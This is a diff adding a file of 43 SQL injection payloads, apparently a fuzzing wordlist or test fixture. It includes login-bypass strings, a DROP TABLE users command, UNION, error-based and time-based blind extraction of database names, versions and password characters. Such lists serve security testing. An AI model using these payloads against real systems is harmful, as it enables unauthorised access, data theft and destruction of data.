@@ -1,0 +1,43 @@
+' OR 1=1 --
+1; DROP TABLE users --
+' UNION SELECT NULL --
+' OR '1'='1
+1' OR '1'='1' --
+admin' --
+' OR SLEEP(5) --
+1; WAITFOR DELAY '0:0:5' --
+' UNION SELECT user(),database(),version() --
+1' AND 1=CONVERT(int,'a') --
+' OR IF(1=1,SLEEP(5),0) --
+1' AND SUBSTRING((SELECT database()),1,1)='t' --
+' OR EXISTS(SELECT * FROM users) --
+1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --
+' OR 1=CAST('1' AS INT) --
+1' AND BENCHMARK(1000000,MD5(1)) --
+' OR @@version LIKE '%' --
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()))) --
+' OR UPDATEXML(1,CONCAT(0x7e,database()),1) --
+1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),0x7e) FROM information_schema.tables) --
+' OR 1=CAST((SELECT database()) AS INT) --
+1' OR 1=(SELECT 1 FROM dual) --
+' AND SUBSTRING(password,1,1)='a' --
+1' OR LENGTH(database())>5 --
+' OR ASCII(SUBSTRING((SELECT user()),1,1))>64 --
+1' AND 1=IF(1=1,1,0) --
+' OR 1 IN (SELECT 1) --
+1' AND 1=(SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END) --
+' OR RANDOMBLOB(1000000) --
+1' AND SLEEP(CASE WHEN 1=1 THEN 5 ELSE 0 END) --
+' OR CONV(HEX(1),16,10)=1 --
+1' OR 1=(SELECT TOP 1 1 FROM users) --
+' AND SUBSTRING((SELECT @@version),1,1)='5' --
+1' OR BINARY 'a'='A' --
+' OR 1=TO_NUMBER('1') --
+1' AND 1=(SELECT COUNT(*) FROM sysobjects) --
+' OR MAKE_SET(1,'a','b')='a' --
+1' AND FIND_IN_SET(1,'1,2,3')>0 --
+' OR ELT(1,'a','b')='a' --
+1' AND REGEXP_SUBSTR('abc', 'a')='a' --
+" OR 1=1 --
+\' OR 1=1 --
+` OR 1=1 --
